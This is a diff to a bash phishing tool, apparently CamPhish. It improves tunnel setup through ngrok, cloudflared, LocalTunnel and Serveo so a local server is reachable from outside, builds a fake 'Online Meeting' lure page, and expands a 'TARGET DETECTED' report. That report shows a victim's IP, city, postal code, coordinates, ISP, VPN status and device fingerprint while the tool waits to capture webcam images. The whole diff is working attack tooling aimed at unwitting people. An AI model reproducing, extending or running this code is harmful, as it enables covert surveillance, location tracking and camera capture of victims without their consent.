@@ -9,13 +9,13 @@ trap 'printf "\n";stop' 2
 # ============================================================================
 # Platform detection
 try_localtunnel() {
-	printf "\e[1;92m[+] Attempting LocalTunnel (npx/localtunnel)...\e[0m\n"
+	printf "\e[1;92m[+] Attempting LocalTunnel (npx/localtunnel)...\e[0m\n" >&2
 	if has_cmd lt; then
 		LT_CMD="lt"
 	elif has_cmd npx; then
 		LT_CMD="npx localtunnel"
 	else
-		printf "\e[1;93m[!] localtunnel (lt) or npx not available\e[0m\n"
+		printf "\e[1;93m[!] localtunnel (lt) or npx not available\e[0m\n" >&2
 		return 1
 	fi
 
@@ -24,56 +24,101 @@ try_localtunnel() {
 	local lt_pid=$!
 
 	local elapsed=0
-	while [[ $elapsed -lt 8 ]]; do
+	while [[ $elapsed -lt 15 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
-		if grep -q "your url is" localtunnel.log 2>/dev/null; then
-			local url=$(grep -o "https://[a-z0-9.-]*\.loc\.lt\|https://[a-z0-9.-]*\.localtunnel\.me" localtunnel.log | head -n1 || true)
+		if [[ -f localtunnel.log ]]; then
+			# Multiple patterns for localtunnel URL (BSD grep compatible)
+			local url=""
+			url=$(grep -o 'https://[a-zA-Z0-9][a-zA-Z0-9_-]*[a-zA-Z0-9]\.loc\.lt' localtunnel.log 2>/dev/null | head -n1 || true)
+			if [[ -z "$url" ]]; then
+				url=$(grep -o 'https://[a-zA-Z0-9_-]\+\.localtunnel\.me' localtunnel.log 2>/dev/null | head -n1 || true)
+			fi
+			if [[ -z "$url" ]]; then
+				url=$(grep -o 'https://[^[:space:]]*loc\.lt[^[:space:]]*' localtunnel.log 2>/dev/null | head -n1 || true)
+			fi
 			if [[ -n "$url" ]]; then
-				printf "\e[1;92m[✓] LocalTunnel ready: $url\e[0m\n"
+				printf "\e[1;92m[✓] LocalTunnel ready: %s\e[0m\n" "$url" >&2
 				echo "$url"
 				return 0
 			fi
 		fi
 	done
 
-	printf "\e[1;93m[!] LocalTunnel timeout or failed\e[0m\n"
+	printf "\e[1;93m[!] LocalTunnel timeout or failed\e[0m\n" >&2
 	kill $lt_pid 2>/dev/null || true
 	return 1
 }
 
 try_cloudflared() {
-	printf "\e[1;92m[+] Attempting Cloudflare Tunnel (cloudflared)...\e[0m\n"
+	printf "\e[1;92m[+] Attempting Cloudflare Tunnel (cloudflared)...\e[0m\n" >&2
 	if ! has_cmd cloudflared; then
-		printf "\e[1;93m[!] cloudflared not installed\e[0m\n"
+		printf "\e[1;93m[!] cloudflared not installed\e[0m\n" >&2
 		return 1
 	fi
 
 	pkill -f "cloudflared" 2>/dev/null || true
+	sleep 1
 	cloudflared tunnel --url http://127.0.0.1:$PHP_PORT > cloudflared.log 2>&1 &
 	local cf_pid=$!
 
 	local elapsed=0
-	while [[ $elapsed -lt 12 ]]; do
+	local url=""
+	
+	while [[ $elapsed -lt 30 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
-		# cloudflared prints the public url in logs - look for the actual tunnel URL
-		local url=$(grep -oP 'https://[a-z0-9\-]+\.trycloudflare\.com' cloudflared.log | head -n1 || true)
-		if [[ -z "$url" ]]; then
-			# Fallback: match line containing "https://...trycloudflare.com"
-			url=$(grep -o 'https://[^[:space:]]*\.trycloudflare\.com' cloudflared.log | head -n1 || true)
+		
+		# Check if process still alive
+		if ! kill -0 $cf_pid 2>/dev/null; then
+			printf "\e[1;31m[!] cloudflared process crashed\e[0m\n" >&2
+			return 1
 		fi
+		
+		# Try multiple patterns to extract URL (compatible with BSD grep)
+		if [[ -f cloudflared.log ]]; then
+			# Pattern 1: Standard trycloudflare.com URL
+			url=$(grep -o 'https://[a-zA-Z0-9][a-zA-Z0-9_-]*[a-zA-Z0-9]\.trycloudflare\.com' cloudflared.log 2>/dev/null | head -n1 || true)
+			# Pattern 2: Alternate format
+			if [[ -z "$url" ]]; then
+				url=$(grep -o 'https://[a-zA-Z0-9_-]\+\.trycloudflare\.com' cloudflared.log 2>/dev/null | head -n1 || true)
+			fi
+			# Pattern 3: Generic HTTPS URL with trycloudflare
+			if [[ -z "$url" ]]; then
+				url=$(grep -o 'https://[^[:space:]]*trycloudflare[^[:space:]]*' cloudflared.log 2>/dev/null | head -n1 || true)
+			fi
+		fi
+		
 		if [[ -n "$url" ]]; then
-			printf "\e[1;92m[✓] cloudflared ready: $url\e[0m\n"
-			echo "$url"
-			return 0
+			printf "\e[1;93m[+] Found cloudflared URL: %s\e[0m\n" "$url" >&2
+			printf "\e[1;93m[+] Waiting for DNS propagation (10 seconds)...\e[0m\n" >&2
+			
+			# Wait for DNS to propagate
+			sleep 10
+			
+			# Test DNS resolution
+			if nslookup $(echo "$url" | sed 's|https://||') >/dev/null 2>&1 || \
+			   host $(echo "$url" | sed 's|https://||') >/dev/null 2>&1 || \
+			   ping -c 1 -W 3 $(echo "$url" | sed 's|https://||') >/dev/null 2>&1; then
+				printf "\e[1;92m[✓] cloudflared ready: %s (DNS verified)\e[0m\n" "$url" >&2
+				echo "$url"
+				return 0
+			else
+				printf "\e[1;93m[!] DNS not ready yet, waiting...\e[0m\n" >&2
+				sleep 5
+			fi
+		fi
+		
+		if [[ $elapsed -eq 15 ]]; then
+			printf "\e[1;93m[!] Still waiting for cloudflared (15/30 seconds)...\e[0m\n" >&2
 		fi
 	done
 
-	printf "\e[1;93m[!] cloudflared timeout or failed\e[0m\n"
+	printf "\e[1;93m[!] cloudflared timeout or failed\e[0m\n" >&2
+	printf "\e[1;93m[!] Cloudflare tunnels expire when the program stops - this is normal\e[0m\n" >&2
 	if [[ -s cloudflared.log ]]; then
-		printf "\e[1;93m[DEBUG] cloudflared output:\e[0m\n"
-		tail -5 cloudflared.log | sed 's/^/    /'
+		printf "\e[1;93m[DEBUG] cloudflared output:\e[0m\n" >&2
+		tail -10 cloudflared.log | sed 's/^/    /' >&2
 	fi
 	kill $cf_pid 2>/dev/null || true
 	return 1
@@ -182,8 +227,21 @@ dependencies() {
 
 # ============================================================================
 # Auto-install missing dependencies across platforms
+# PREVENTS LOOPS: Checks marker file and only runs once per day
 # ============================================================================
 auto_install_dependencies() {
+	# Check if we already ran today (prevent loops)
+	local marker_file=".camphish_deps_installed"
+	local current_date=$(date +%Y%m%d 2>/dev/null || echo "unknown")
+	
+	if [[ -f "$marker_file" ]]; then
+		local marker_date=$(cat "$marker_file" 2>/dev/null || echo "")
+		if [[ "$marker_date" == "$current_date" ]]; then
+			printf "\e[1;92m[✓] Dependencies already checked today (skip to prevent loop)\e[0m\n"
+			return 0
+		fi
+	fi
+	
 	printf "\n\e[1;92m[*] Checking recommended dependencies and optional tools...\e[0m\n"
 
 	# Lists of checks
@@ -227,6 +285,8 @@ auto_install_dependencies() {
 
 	if [[ ${#missing_apt[@]} -eq 0 && ${#missing_pip[@]} -eq 0 && ${#missing_bin[@]} -eq 0 ]]; then
 		printf "\e[1;92m[✓] All recommended tools appear present\e[0m\n"
+		# Update marker file even if nothing to install
+		echo "$current_date" > "$marker_file"
 		return 0
 	fi
 
@@ -335,6 +395,8 @@ auto_install_dependencies() {
 		fi
 	done
 
+	# Mark as done for today
+	echo "$current_date" > "$marker_file"
 	printf "\e[1;92m[✓] Auto-install attempt finished (see install.log for details).\e[0m\n"
 }
 
@@ -355,10 +417,18 @@ stop() {
 # ============================================================================
 catch_ip() {
 	if [[ -f "ip.txt" ]]; then
-		# Extract all data from ip.txt
+		# Extract all data from ip.txt for quick display
 		ip=$(grep -a 'IP ADDRESS:' ip.txt | head -1 | sed 's/.*IP ADDRESS: //g' | tr -d '\r' | xargs)
-		geo=$(grep -a 'GEOLOCATION:' ip.txt | head -1 | sed 's/.*GEOLOCATION: //g' | tr -d '\r' | xargs)
+		country=$(grep -a 'COUNTRY:' ip.txt | head -1 | sed 's/.*COUNTRY: //g' | tr -d '\r' | xargs)
+		state=$(grep -a 'STATE/REGION:' ip.txt | head -1 | sed 's/.*STATE\/REGION: //g' | tr -d '\r' | xargs)
+		city=$(grep -a 'CITY:' ip.txt | head -1 | sed 's/.*CITY: //g' | tr -d '\r' | sed 's/ | Postal:.*//' | xargs)
+		postal=$(grep -a 'CITY:' ip.txt | head -1 | sed 's/.*Postal: //g' | tr -d '\r' | xargs)
 		coords=$(grep -a 'COORDINATES:' ip.txt | head -1 | sed 's/.*COORDINATES: //g' | tr -d '\r' | xargs)
+		isp=$(grep -a 'ISP:' ip.txt | head -1 | sed 's/.*ISP: //g' | tr -d '\r' | xargs)
+		asn=$(grep -a 'ASN:' ip.txt | head -1 | sed 's/.*ASN: //g' | tr -d '\r' | xargs)
+		org=$(grep -a 'ORGANIZATION:' ip.txt | head -1 | sed 's/.*ORGANIZATION: //g' | tr -d '\r' | xargs)
+		vpn=$(grep -a 'VPN:' ip.txt | head -1 | sed 's/.*VPN: //g' | tr -d '\r' | xargs)
+		proxy=$(grep -a 'PROXY:' ip.txt | head -1 | sed 's/.*PROXY: //g' | tr -d '\r' | xargs)
 		os=$(grep -a 'OS:' ip.txt | head -1 | sed 's/.*OS: //g' | tr -d '\r' | xargs)
 		browser=$(grep -a 'BROWSER:' ip.txt | head -1 | sed 's/.*BROWSER: //g' | tr -d '\r' | xargs)
 		device_type=$(grep -a 'DEVICE TYPE:' ip.txt | head -1 | sed 's/.*DEVICE TYPE: //g' | tr -d '\r' | xargs)
@@ -366,26 +436,36 @@ catch_ip() {
 		language=$(grep -a 'LANGUAGE:' ip.txt | head -1 | sed 's/.*LANGUAGE: //g' | tr -d '\r' | xargs)
 		
 		if [[ -n "$ip" ]]; then
-			printf "\n\e[1;92m╔════════════════════════════════════════════════════════════════════╗\e[0m\n"
-			printf "\e[1;92m║\e[0m\e[1;77m                      ✅ TARGET DETECTED ✅                      \e[0m\e[1;92m║\e[0m\n"
-			printf "\e[1;92m╠════════════════════���═══════════════════════════════════════════════╣\e[0m\n"
-			printf "\e[1;92m║\e[0m  \e[1;93m[+] IP ADDRESS: \e[1;77m%-55s\e[0m\e[1;92m║\e[0m\n" "$ip"
-			printf "\e[1;92m║\e[0m  \e[1;93m[+] GEOLOCATION: \e[1;77m%-53s\e[0m\e[1;92m║\e[0m\n" "$geo"
-			printf "\e[1;92m║\e[0m  \e[1;93m[+] COORDINATES: \e[1;77m%-53s\e[0m\e[1;92m║\e[0m\n" "$coords"
-			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
-			printf "\e[1;92m║\e[0m  \e[1;93m[DEVICE INFO]\e[0m\n"
-			printf "\e[1;92m║\e[0m    • OS: \e[1;77m%-60s\e[0m\e[1;92m║\e[0m\n" "$os"
-			printf "\e[1;92m║\e[0m    • Browser: \e[1;77m%-56s\e[0m\e[1;92m║\e[0m\n" "$browser"
-			printf "\e[1;92m║\e[0m    • Device Type: \e[1;77m%-52s\e[0m\e[1;92m║\e[0m\n" "$device_type"
-			printf "\e[1;92m║\e[0m    • Device Name: \e[1;77m%-52s\e[0m\e[1;92m║\e[0m\n" "$device_name"
-			printf "\e[1;92m║\e[0m    • Language: \e[1;77m%-56s\e[0m\e[1;92m║\e[0m\n" "$language"
-			printf "\e[1;92m╠════════════════════════════════════════════════════════════════════╣\e[0m\n"
-			printf "\e[1;92m║\e[0m  \e[1;93m[+] Timestamp: \e[1;77m%-55s\e[0m\e[1;92m║\e[0m\n" "$(date '+%Y-%m-%d %H:%M:%S')"
-			printf "\e[1;92m║\e[0m  \e[1;93m[+] Status: \e[1;77mLink Opened - Waiting for Camera\e[0m\e[1;92m║\e[0m\n"
-			printf "\e[1;92m╚════════════════════════════════════════════════════════════════════╝\e[0m\n"
+			printf "\n"
+			printf "\e[1;96m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\e[0m\n"
+			printf "\e[1;96m┃\e[0m\e[1;92m                        🎯 TARGET DETECTED - ANALYSIS REPORT                    \e[0m\e[1;96m┃\e[0m\n"
+			printf "\e[1;96m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\e[0m\n"
+			printf "\e[1;96m┃\e[0m \e[1;93m📍 IP LOCATION\e[0m                                                                  \e[1;96m┃\e[0m\n"
+			printf "\e[1;96m┃\e[0m   \e[1;77mIP Address:\e[0m  \e[1;96m%-67s\e[0m\e[1;96m┃\e[0m\n" "$ip"
+			printf "\e[1;96m┃\e[0m   \e[1;77mCountry:\e[0m     %-67s\e[1;96m┃\e[0m\n" "$country"
+			printf "\e[1;96m┃\e[0m   \e[1;77mState:\e[0m       %-67s\e[1;96m┃\e[0m\n" "$state"
+			printf "\e[1;96m┃\e[0m   \e[1;77mCity:\e[0m        %-67s\e[1;96m┃\e[0m\n" "$city"
+			printf "\e[1;96m┃\e[0m   \e[1;77mPostal:\e[0m      %-67s\e[1;96m┃\e[0m\n" "$postal"
+			printf "\e[1;96m┃\e[0m   \e[1;77mCoordinates:\e[0m %-67s\e[1;96m┃\e[0m\n" "$coords"
+			printf "\e[1;96m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\e[0m\n"
+			printf "\e[1;96m┃\e[0m \e[1;93m🌐 NETWORK INTELLIGENCE\e[0m                                                         \e[1;96m┃\e[0m\n"
+			printf "\e[1;96m┃\e[0m   \e[1;77mISP:\e[0m         %-67s\e[1;96m┃\e[0m\n" "$isp"
+			printf "\e[1;96m┃\e[0m   \e[1;77mASN:\e[0m         %-67s\e[1;96m┃\e[0m\n" "$asn"
+			printf "\e[1;96m┃\e[0m   \e[1;77mOrg:\e[0m         %-67s\e[1;96m┃\e[0m\n" "$org"
+			printf "\e[1;96m┃\e[0m   \e[1;77mVPN/Proxy:\e[0m   %-67s\e[1;96m┃\e[0m\n" "$vpn / $proxy"
+			printf "\e[1;96m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\e[0m\n"
+			printf "\e[1;96m┃\e[0m \e[1;93m💻 DEVICE FINGERPRINT\e[0m                                                            \e[1;96m┃\e[0m\n"
+			printf "\e[1;96m┃\e[0m   \e[1;77mOS:\e[0m          %-67s\e[1;96m┃\e[0m\n" "$os"
+			printf "\e[1;96m┃\e[0m   \e[1;77mBrowser:\e[0m     %-67s\e[1;96m┃\e[0m\n" "$browser"
+			printf "\e[1;96m┃\e[0m   \e[1;77mDevice:\e[0m      %-67s\e[1;96m┃\e[0m\n" "$device_name ($device_type)"
+			printf "\e[1;96m┃\e[0m   \e[1;77mLanguage:\e[0m    %-67s\e[1;96m┃\e[0m\n" "$language"
+			printf "\e[1;96m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\e[0m\n"
+			printf "\e[1;96m┃\e[0m \e[1;93m⏱️  TIMESTAMP:\e[0m \e[1;77m%-55s\e[0m\e[1;96m┃\e[0m\n" "$(date '+%Y-%m-%d %H:%M:%S')"
+			printf "\e[1;96m┃\e[0m \e[1;93m📡 STATUS:\e[0m    \e[1;92m%-55s\e[0m\e[1;96m┃\e[0m\n" "🟢 Link Opened - Waiting for Camera"
+			printf "\e[1;96m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\e[0m\n"
 			
 			# Display full JSON data for complete information
-			printf "\n\e[1;92m[📋] Full Target Data (JSON):\e[0m\n"
+			printf "\n\e[1;95m[📋] Complete Target Data (JSON):\e[0m\n"
 			if [[ -f "ip.json" ]]; then
 				tail -1 ip.json | python3 -m json.tool 2>/dev/null || tail -1 ip.json
 			fi
@@ -416,18 +496,16 @@ catch_camera() {
 
 checkfound() {
 	printf "\n"
-	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
-	printf "\e[1;92m║\e[0m\e[1;77m           🔍 MONITORING FOR TARGETS 🔍                  \e[0m\e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m  Waiting for targets to open link...                      \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m  Press Ctrl+C to exit                                     \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m  📍 Log Locations:                                        \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m     • IP Logs: ip.txt, ip.json, saved.ip.txt              \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m     • Camera: Log.log, captures.json                      \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m     • Images: ../cam_*.png (Parent CamN folder)           \e[1;92m║\e[0m\n"
-	printf "\e[1;92m║\e[0m                                                            \e[1;92m║\e[0m\n"
-	printf "\e[1;92m╚════════════════════════════════════════════════════════════╝\e[0m\n"
+	printf "\e[1;96m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\e[0m\n"
+	printf "\e[1;96m┃\e[0m\e[1;92m                    � LIVE TARGET MONITORING SYSTEM �                       \e[0m\e[1;96m┃\e[0m\n"
+	printf "\e[1;96m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\e[0m\n"
+	printf "\e[1;96m┃\e[0m  \e[1;93m⏳ Waiting for targets to open link...\e[0m                                      \e[1;96m┃\e[0m\n"
+	printf "\e[1;96m┃\e[0m  \e[1;93m🛑 Press Ctrl+C to exit\e[0m                                                    \e[1;96m┃\e[0m\n"
+	printf "\e[1;96m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫\e[0m\n"
+	printf "\e[1;96m┃\e[0m  \e[1;93m📍 DATA LOG LOCATIONS:\e[0m                                                      \e[1;96m┃\e[0m\n"
+	printf "\e[1;96m┃\e[0m     • \e[1;77mIP Data:\e[0m ip.txt, ip.json, saved.ip.txt                               \e[1;96m┃\e[0m\n"
+	printf "\e[1;96m┃\e[0m     • \e[1;77mCamera:\e[0m  Log.log, captures.json, ../cam_*.png                        \e[1;96m┃\e[0m\n"
+	printf "\e[1;96m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\e[0m\n"
 	printf "\n"
 	
 	while [ true ]; do
@@ -583,7 +661,7 @@ try_ngrok() {
 		return 1
 	fi
 
-	printf "\e[1;92m[+] ngrok: starting (waiting up to 5 seconds): \e[0m"
+	printf "\e[1;92m[+] ngrok: starting (waiting up to 15 seconds): \e[0m" >&2
 	
 	# Kill any existing ngrok
 	pkill -f "ngrok http" 2>/dev/null || true
@@ -593,53 +671,68 @@ try_ngrok() {
 	$NGROK_CMD http $PHP_PORT --log=stdout > ngrok.log 2>&1 &
 	local ngrok_pid=$!
 	
-	# Monitor for 5 seconds
+	# Monitor for 15 seconds
 	local elapsed=0
 	local link=""
 	
-	while [[ $elapsed -lt 5 ]]; do
+	while [[ $elapsed -lt 15 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
 		
 		# Check if process alive
 		if ! kill -0 $ngrok_pid 2>/dev/null; then
-			printf "\n\e[1;31m[!] ngrok process crashed\e[0m\n"
-			# Show ngrok error
+			printf "\n\e[1;31m[!] ngrok process crashed\e[0m\n" >&2
 			if [[ -s ngrok.log ]]; then
-				printf "\e[1;93m[DEBUG] Last 5 lines of ngrok.log:\e[0m\n"
-				tail -5 ngrok.log | sed 's/^/    /'
+				printf "\e[1;93m[DEBUG] Last 5 lines of ngrok.log:\e[0m\n" >&2
+				tail -5 ngrok.log | sed 's/^/    /' >&2
 			fi
 			return 1
 		fi
 		
-		# Check for link
-		link=$(grep -oP 'https://[A-Za-z0-9\-\.]+\.ngrok\.io' ngrok.log 2>/dev/null | head -1)
+		# Check for link - support both old .ngrok.io and new .ngrok-free.app domains
+		if [[ -f ngrok.log ]]; then
+			# Pattern 1: Standard ngrok.io URLs
+			link=$(grep -o 'https://[a-zA-Z0-9][a-zA-Z0-9_-]*[a-zA-Z0-9]\.ngrok\.io' ngrok.log 2>/dev/null | head -n1 || true)
+			# Pattern 2: New ngrok-free.app URLs
+			if [[ -z "$link" ]]; then
+				link=$(grep -o 'https://[a-zA-Z0-9_-]\+\.ngrok-free\.app' ngrok.log 2>/dev/null | head -n1 || true)
+			fi
+			# Pattern 3: Generic ngrok URL patterns
+			if [[ -z "$link" ]]; then
+				link=$(grep -o 'https://[a-zA-Z0-9_-]\+\.ngrok\.[a-zA-Z]\+' ngrok.log 2>/dev/null | head -n1 || true)
+			fi
+			# Pattern 4: Try API endpoint as fallback
+			if [[ -z "$link" ]]; then
+				link=$(curl -s --max-time 2 http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*"' 2>/dev/null | head -n1 | sed 's/.*"https:\/\//;s/"$//' | sed 's/^/https:\/\//' || true)
+			fi
+		fi
+		
 		if [[ -n "$link" ]]; then
-			printf "\e[1;92m ✓\e[0m\n"
-			printf "\e[1;92m[✓] ngrok ready: $link\e[0m\n"
+			printf "\e[1;92m ✓\e[0m\n" >&2
+			printf "\e[1;92m[✓] ngrok ready: %s\e[0m\n" "$link" >&2
 			echo "$link"
 			return 0
 		fi
 		
-		printf "."
+		printf "." >&2
 	done
 	
 	# Timeout occurred
-	printf "\n\e[1;31m[!] ngrok timeout (5 seconds elapsed)\e[0m\n"
+	printf "\n\e[1;31m[!] ngrok timeout (15 seconds elapsed)\e[0m\n" >&2
 	
 	# Diagnose the issue
 	if [[ -s ngrok.log ]]; then
 		if grep -q "invalid auth token\|ERR_NGROK_401" ngrok.log; then
-			printf "\e[1;31m[!] ERROR: Invalid or blocked ngrok token\e[0m\n"
-			printf "\e[1;93m    Visit: https://dashboard.ngrok.com\e[0m\n"
+			printf "\e[1;31m[!] ERROR: Invalid or blocked ngrok token\e[0m\n" >&2
+			printf "\e[1;93m    Visit: https://dashboard.ngrok.com\e[0m\n" >&2
 		elif grep -q "Tunnel limit exceeded\|ERR_NGROK_403" ngrok.log; then
-			printf "\e[1;31m[!] ERROR: Tunnel limit exceeded on ngrok account\e[0m\n"
+			printf "\e[1;31m[!] ERROR: Tunnel limit exceeded on ngrok account\e[0m\n" >&2
 		elif grep -q "ERR_NGROK" ngrok.log; then
-			printf "\e[1;31m[!] ngrok error:\e[0m\n"
-			grep "ERR_NGROK" ngrok.log | head -2 | sed 's/^/    /'
+			printf "\e[1;31m[!] ngrok error:\e[0m\n" >&2
+			grep "ERR_NGROK" ngrok.log | head -2 | sed 's/^/    /' >&2
 		else
-			printf "\e[1;93m[!] ngrok output:\e[0m\n"
-			tail -3 ngrok.log | sed 's/^/    /'
+			printf "\e[1;93m[!] ngrok output:\e[0m\n" >&2
+			tail -5 ngrok.log | sed 's/^/    /' >&2
 		fi
 	fi
 	
@@ -653,11 +746,11 @@ try_ngrok() {
 # ============================================================================
 try_serveo() {
 	if ! has_cmd ssh; then
-		printf "\e[1;31m[✗] ssh not available - Serveo requires SSH\e[0m\n"
+		printf "\e[1;31m[✗] ssh not available - Serveo requires SSH\e[0m\n" >&2
 		return 1
 	fi
 
-	printf "\e[1;92m[+] serveo: starting SSH tunnel (max 10 seconds): \e[0m"
+	printf "\e[1;92m[+] serveo: starting SSH tunnel (max 10 seconds): \e[0m" >&2
 
 	local subdomain="cam$RANDOM"
 	
@@ -671,14 +764,14 @@ try_serveo() {
 	while [[ $elapsed -lt 3 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
-		printf "."
+		printf "." >&2
 		
 		# Check for link
 		if [[ -f sendlink ]]; then
-			local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
+			local link=$(grep -oE "https://[a-zA-Z0-9_-]+\.serveo\.net" sendlink | head -n1 || true)
 			if [[ -n "$link" ]]; then
-				printf "\e[1;92m ✓\e[0m\n"
-				printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
+				printf "\e[1;92m ✓\e[0m\n" >&2
+				printf "\e[1;92m[✓] serveo ready: %s\e[0m\n" "$link" >&2
 				echo "$link"
 				return 0
 			fi
@@ -689,13 +782,13 @@ try_serveo() {
 	while [[ $elapsed -lt 10 ]]; do
 		sleep 1
 		elapsed=$((elapsed+1))
-		printf "."
+		printf "." >&2
 		
 		if [[ -f sendlink ]]; then
-			local link=$(grep -o "https://[^ ]*serveo[^ ]*" sendlink | head -n1 || true)
+			local link=$(grep -oE "https://[a-zA-Z0-9_-]+\.serveo\.net" sendlink | head -n1 || true)
 			if [[ -n "$link" ]]; then
-				printf "\e[1;92m ✓\e[0m\n"
-				printf "\e[1;92m[✓] serveo ready: $link\e[0m\n"
+				printf "\e[1;92m ✓\e[0m\n" >&2
+				printf "\e[1;92m[✓] serveo ready: %s\e[0m\n" "$link" >&2
 				echo "$link"
 				return 0
 			fi
@@ -703,18 +796,18 @@ try_serveo() {
 	done
 	
 	# Timeout
-	printf "\e[1;31m ✗\e[0m\n"
-	printf "\e[1;31m[!] Serveo timeout (10 seconds elapsed)\e[0m\n"
+	printf "\e[1;31m ✗\e[0m\n" >&2
+	printf "\e[1;31m[!] Serveo timeout (10 seconds elapsed)\e[0m\n" >&2
 	
 	# Diagnose
 	if [[ -f sendlink ]] && [[ -s sendlink ]]; then
 		if grep -q "Connection refused\|Network is unreachable" sendlink; then
-			printf "\e[1;31m[!] Network error: Cannot reach serveo.net\e[0m\n"
+			printf "\e[1;31m[!] Network error: Cannot reach serveo.net\e[0m\n" >&2
 		elif grep -q "Timeout\|timed out" sendlink; then
-			printf "\e[1;31m[!] Connection timeout to serveo.net\e[0m\n"
+			printf "\e[1;31m[!] Connection timeout to serveo.net\e[0m\n" >&2
 		else
-			printf "\e[1;93m[DEBUG] SSH output (last 3 lines):\e[0m\n"
-			tail -3 sendlink | sed 's/^/    /'
+			printf "\e[1;93m[DEBUG] SSH output (last 3 lines):\e[0m\n" >&2
+			tail -3 sendlink | sed 's/^/    /' >&2
 		fi
 	fi
 	
@@ -795,8 +888,10 @@ payload() {
 				cp OnlineMeeting.html index2.html
 			fi
 			# Replace post_url_placeholder with actual server URL
-			if ! sed -i "s|post_url_placeholder|$link_esc|g" index2.html 2>/dev/null; then
+			if ! sed "s|post_url_placeholder|$link_esc|g" index2.html > index2.html.tmp 2>/dev/null; then
 				printf "\e[1;31m[!] Error: sed failed to process post_url_placeholder\e[0m\n"
+			else
+				mv index2.html.tmp index2.html 2>/dev/null || true
 			fi
 			printf "\e[1;92m[✓] Online Meeting page created\e[0m\n"
 			;;
@@ -984,26 +1079,44 @@ main() {
 		case "$t" in
 			ngrok)
 				printf "\e[1;92m[+] Trying ngrok...\e[0m\n"
-				link=$(try_ngrok 2>&1) || link=""
+				link=$(try_ngrok) || link=""
 				;;
 			localtunnel)
 				printf "\e[1;92m[+] Trying LocalTunnel...\e[0m\n"
-				link=$(try_localtunnel 2>&1) || link=""
+				link=$(try_localtunnel) || link=""
 				;;
 			cloudflared)
 				printf "\e[1;92m[+] Trying cloudflared...\e[0m\n"
-				link=$(try_cloudflared 2>&1) || link=""
+				link=$(try_cloudflared) || link=""
 				;;
 			serveo)
 				printf "\e[1;92m[+] Trying Serveo...\e[0m\n"
-				link=$(try_serveo 2>&1) || link=""
+				link=$(try_serveo) || link=""
 				;;
 		esac
 
 		if [[ -n "$link" ]]; then
-			printf "\e[1;92m[✓] SUCCESS with %s!\e[0m\n" "$t"
-			link_rc=0
-			break
+			# DEBUG: Show what we got
+			printf "\e[1;93m[DEBUG] Raw link from %s: '%s'\e[0m\n" "$t" "$link"
+			
+			# Validate link format - more permissive regex for tunnel URLs
+			# Matches: https://anything.domain.tld with multiple subdomains allowed
+			if [[ "$link" =~ ^https://[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)*\.[a-zA-Z]+$ ]]; then
+				printf "\e[1;92m[✓] SUCCESS with %s!\e[0m\n" "$t"
+				printf "\e[1;92m[+] Validating link...\e[0m\n"
+				# Quick test - try to reach the tunnel endpoint
+				if curl -s --max-time 5 -o /dev/null -w "%{http_code}" "$link" 2>/dev/null | grep -q "200\|302\|404"; then
+					printf "\e[1;92m[✓] Link is reachable!\e[0m\n"
+				else
+					printf "\e[1;93m[!] Link may not be immediately reachable (tunnel still starting)\e[0m\n"
+					printf "\e[1;93m[!] IMPORTANT: Tunnels expire when you close this program!\e[0m\n"
+				fi
+				link_rc=0
+				break
+			else
+				printf "\e[1;93m[!] Invalid link format from %s, trying next...\e[0m\n" "$t"
+				link=""
+			fi
 		fi
 	done
 
@@ -1018,6 +1131,8 @@ main() {
 	fi
 
 	printf "\e[1;92m[+] Link obtained successfully!\e[0m\n\n"
+	printf "\e[1;93m[!] IMPORTANT: This link only works while this program is running!\e[0m\n"
+	printf "\e[1;93m[!] If you close this window, the tunnel will stop working.\e[0m\n\n"
 	printf "\e[1;92m╔════════════════════════════════════════════════════════════╗\e[0m\n"
 	printf "\e[1;92m║\e[0m\e[1;77m          PUBLIC LINK - SHARE THIS WITH TARGET          \e[0m\e[1;92m║\e[0m\n"
